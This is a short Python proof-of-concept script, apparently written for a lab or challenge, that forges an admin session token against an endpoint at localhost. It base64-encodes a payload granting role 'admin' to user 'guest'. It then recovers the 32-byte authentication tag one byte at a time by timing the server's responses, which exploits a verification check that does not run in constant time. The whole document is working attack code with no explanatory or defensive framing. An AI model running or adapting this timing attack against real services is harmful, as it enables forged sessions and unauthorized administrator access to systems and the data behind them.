import time
import base64
import requests

URL = "http://localhost/auth" #for local POC
payload = "{'username':'guest', 'role':'admin'}".encode()
payload_b64 = base64.b64encode(payload).decode()
auth_tag_fake = bytearray([0] * 32)

session = requests.Session()

def guess_byte(position: int, current_tag: bytearray):
    best_byte = 0
    best_time = 0  
    for byte_guess in range(256): 
        current_tag[position] = byte_guess
        auth_tag_b64 = base64.b64encode(bytes(current_tag)).decode()
        session_token = f"{payload_b64}.{auth_tag_b64}"
        headers = {"Cookie": f"session_token={session_token}"}  
        start_time = time.time()
        
        response = session.get(URL, headers=headers)
        end_time = time.time()
        
        response_time = end_time - start_time
        print(f"Trying byte {byte_guess:02x} at position {position}, time: {response_time:.6f}s")
        
        if response_time > best_time:  # Cf verify function with sleep
            best_time = response_time
            best_byte = byte_guess
    
    current_tag[position] = best_byte
    print(f"Byte {best_byte:02x} found at position {position}, time: {best_time:.6f}s")
    
    return current_tag

for position in range(32):
    print(f"Guessing byte {position + 1}/32")
    auth_tag_fake = guess_byte(position, auth_tag_fake)

auth_tag_b64 = base64.b64encode(bytes(auth_tag_fake)).decode()
session_token = f"{payload_b64}.{auth_tag_b64}"

print(f"Final Session Token: {session_token}")

